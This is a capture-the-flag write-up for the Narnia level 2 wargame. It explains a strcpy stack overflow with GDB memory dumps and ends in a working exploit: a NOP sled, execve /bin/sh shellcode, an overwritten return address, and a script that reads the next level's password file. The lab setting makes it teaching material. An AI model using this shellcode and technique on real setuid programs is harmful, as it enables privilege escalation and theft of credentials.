# narnia2

`/narnia/narnia2` can be exploited by a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow) attack.

## Aim

When run, execute arbitary code. In this case, load the code into memory as a variable, then execute it.

## Analysis

```c
int main(int argc, char * argv[]){
	char buf[128];

	if(argc == 1){
		printf("Usage: %s argument\n", argv[0]);
		exit(1);
	}
	strcpy(buf,argv[1]);
	printf("%s", buf);

	return 0;
}
```

Here we can see that our first command line argument (`argv[1]`) will be copied into `buf` in an unsafe way, resulting in a buffer overflow.

The bits of the stack we're interested in will look something like:

|address|frame|stack|
|-|-|-|
|low|main|`buf`|
| |main|`main` return pointer|
|high|*start_main*|command line arguments|

The **return pointer** is interesting as it tells the program where to move execution to at the end of the **function** (in this case, `main()`).

If we can move where execution occurs, we can execute whatever we like!

### GDB (The GNU Debugger)

We can run the program using GDB to gain some insight.

```
narnia2@narnia:~$ gdb /narnia/narnia2
```

Firstly we'll set a breakpoint at `printf`. This will stop execution of the program after the line `printf("%s", buf);`. This will keep everything we're interested in in memory for us to analyse - if we let `main` return, the memory may be reallocated or overwritten.

We'll run `narnia2` with the argument `$(printf "\x61%.0s" {1..128})` (128 letter a's) so we can easily see the variables in memory:

```
(gdb) break printf
Breakpoint 1 at 0x8048310
(gdb) run $(printf "\x61%.0s" {1..128})
Starting program: /narnia/narnia2 $(printf "\x61%.0s" {1..128})
Breakpoint 1, 0xf7e6fdd0 in printf () from /lib32/libc.so.6
```

While the program is paused, dump the memory to the screen:

> `$esp` references the **stack pointer** (the top of the stack), in this case the lowest valid memory address.

```
(gdb) x/300x $esp
0xffffd60c:	0x080484bc	0x08048574	0xffffd620	0x00000000
0xffffd61c:	0x00000000	0x61616161	0x61616161	0x61616161
0xffffd62c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd63c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd64c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd65c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd66c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd67c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd68c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd69c:	0x61616161	0x08048400	0x00000000	0x00000000
0xffffd6ac:	0xf7e3cad3	0x00000002	0xffffd744	0xffffd750
0xffffd6bc:	0xf7feacca	0x00000002	0xffffd744	0xffffd6e4
0xffffd6cc:	0x08049768	0x0804821c	0xf7fcc000	0x00000000
0xffffd6dc:	0x00000000	0x00000000	0x71bdeaaa	0x4985aeba
0xffffd6ec:	0x00000000	0x00000000	0x00000000	0x00000002
0xffffd6fc:	0x08048360	0x00000000	0xf7ff04c0	0xf7e3c9e9
0xffffd70c:	0xf7ffd000	0x00000002	0x08048360	0x00000000
0xffffd71c:	0x08048381	0x0804845d	0x00000002	0xffffd744
0xffffd72c:	0x080484d0	0x08048540	0xf7feb160	0xffffd73c
0xffffd73c:	0x0000001c	0x00000002	0xffffd868	0xffffd878
0xffffd74c:	0x00000000	0xffffd8f9	0xffffd909	0xffffd91d
0xffffd75c:	0xffffd93c	0xffffd94f	0xffffd958	0xffffd965
0xffffd76c:	0xffffde86	0xffffde91	0xffffde9c	0xffffdefa
0xffffd77c:	0xffffdf11	0xffffdf20	0xffffdf32	0xffffdf43
0xffffd78c:	0xffffdf4c	0xffffdf5f	0xffffdf67	0xffffdf77
0xffffd79c:	0xffffdfa6	0xffffdfc6	0x00000000	0x00000020
0xffffd7ac:	0xf7fdbbe0	0x00000021	0xf7fdb000	0x00000010
0xffffd7bc:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xffffd7cc:	0x00000064	0x00000003	0x08048034	0x00000004
0xffffd7dc:	0x00000020	0x00000005	0x00000008	0x00000007
0xffffd7ec:	0xf7fdc000	0x00000008	0x00000000	0x00000009
0xffffd7fc:	0x08048360	0x0000000b	0x000036b2	0x0000000c
0xffffd80c:	0x000036b2	0x0000000d	0x000036b2	0x0000000e
0xffffd81c:	0x000036b2	0x00000017	0x00000000	0x00000019
0xffffd82c:	0xffffd84b	0x0000001f	0xffffdfe8	0x0000000f
0xffffd83c:	0xffffd85b	0x00000000	0x00000000	0x4f000000
0xffffd84c:	0x4573339b	0x8faac708	0xa5e8ffc3	0x69e7f162
0xffffd85c:	0x00363836	0x00000000	0x00000000	0x72616e2f
0xffffd86c:	0x2f61696e	0x6e72616e	0x00326169	0x61616161
0xffffd87c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd88c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd89c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8ac:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8bc:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8cc:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8dc:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8ec:	0x61616161	0x61616161	0x61616161	0x45485300
0xffffd8fc:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400
0xffffd90c:	0x74783d4d	0x2d6d7265	0x63363532	0x726f6c6f
0xffffd91c:	0x48535300	0x494c435f	0x3d544e45	0x2e323731
...
```

> Note that this view shows **each 4 byte block as an integer**. So for example, on this example (little-endian linux), address `0xffff9d1c` is shown as `0x48535300`, because
>
> - byte `0xffff9d1c = 0x00`
> - byte `0xffff9d1d = 0x53`
> - byte `0xffff9d1e = 0x53`
> - byte `0xffff9d1f = 0x48`

We can also now look at how the `main` function returns, by stepping through the rest of the program:

```
(gdb) step
Single stepping until exit from function printf,
which has no line number information.
0x080484bc in main ()
(gdb) step
Single stepping until exit from function main,
which has no line number information.
0xf7e3cad3 in __libc_start_main () from /lib32/libc.so.6
```

### The return pointer

Stepping through the `main` function returning like this gives us the value of the **return pointer** - in this case, `0xf7e3cad3`. From the memory dump above, we can see this was in memory at `0xffffd6ac`. This is what we want to overwrite!

### The `buf` variable

We can clearly see the blocks of `0x61` from `0xffffd878` to `0xffffd8f7`, and from `0xffffd62a` to `0xffffd69f`. The one at the bottom of the stack *(higher address)* is the raw command line argument, the one at the top of the stack *(lower address)* is `buf`. `buf` is the area of memory the overflow will occur, as it has been allocated a fixed size.


## Exploitation
### Design

The main focus of our attack will be to:

- Load some exploit code into memory
- Overwrite the return pointer to point to this code

The return pointer always has to return towards the top of the stack. So we will want the new return pointer to point to the raw command line memory, say `0xffffd8c0`. This is where code execution will start from:

```
NOP_SLED_POINTER="\xc0\xd8\xff\xff"
```

So the pointer doesn't have to be too accurate, we can use a [NOP sled](https://en.wikipedia.org/wiki/NOP_slide). This effectively provides a wider target for the pointer - we attach our shellcode after this section and it's easier to hit.

```
NOP_SLED=$(printf "\x90%.0s" {1..115})
```

Same shellcode as before:

```
EGGSHELL="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
```

Together these make the full exploit:

```
EXPLOIT_ARGUMENT=$(printf "$NOP_SLED$EGGSHELL$NOP_SLED_POINTER")
```

The **length of the NOP sled is important**. Remember we are exploiting this program by overflowing a buffer! We already determined we wanted to overflow from the end of `buf` (`0xffffd69f`) to the end of the return pointer (`0xffffd6af`). This is **16 bytes**.

Time for some arithmetic (in bytes):

- Initial `buf` length (128) + Overflow length (16) = Total argument length required (**144**)
- Total length (144) - (Shellcode length (25) + Pointer length (4)) = NOP Sled length (**115**)


### Action breakdown

```
0xffffd60c:	..........	..........	..........	..........
0xffffd61c:	..........	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd62c:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd63c:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd64c:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd65c:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd66c:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd67c:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd68c:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd69c:	SHELLCODE	SHELLCODE	SHELLCODE	SHELLCODE	# buffer overflow
0xffffd6ac:	0xffffd8c0	..........	..........	..........	# overwrites pointer
...
0xffffd86c:	..........	..........	..........	NOP_SLED	# when main() exits
0xffffd87c:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd88c:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED	# causes execution jump
0xffffd89c:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED	# to NOP sled
0xffffd8ac:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd8bc:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd8cc:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd8dc:	NOP_SLED	NOP_SLED	NOP_SLED	NOP_SLED
0xffffd8ec:	NOP_SLED	NOP_SLED	SHELLCODE	SHELLCODE	# and shellcode
0xffffd8fc:	SHELLCODE	SHELLCODE	NEW_POINTER	..........	# is run
0xffffd90c:	..........	..........	..........	..........
```

### Implementation

We can simply run this as a one-line to get a shell:

```
/narnia/narnia2 $(printf "\x90%.0s" {1..115} && printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" && printf "\xc0\xd8\xff\xff")
```

We can also get the password nicely from one script:

```bash
#!/bin/bash

# Shellcode that will open us a shell
EGGSHELL="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

# NOP sled
NOP_SLED=$(printf "\x90%.0s" {1..115})

# Pointer to where we think the NOP sled will be in memory
NOP_SLED_POINTER="\xc0\xd8\xff\xff"

# Complete exploit to put in memory
EXPLOIT_ARGUMENT=$(printf "$NOP_SLED$EGGSHELL$NOP_SLED_POINTER")

# Command we want to run once given shell
printf "cat /etc/narnia_pass/narnia3" | \

# Pass to the exploitable program
/narnia/narnia2 $EXPLOIT_ARGUMENT
```
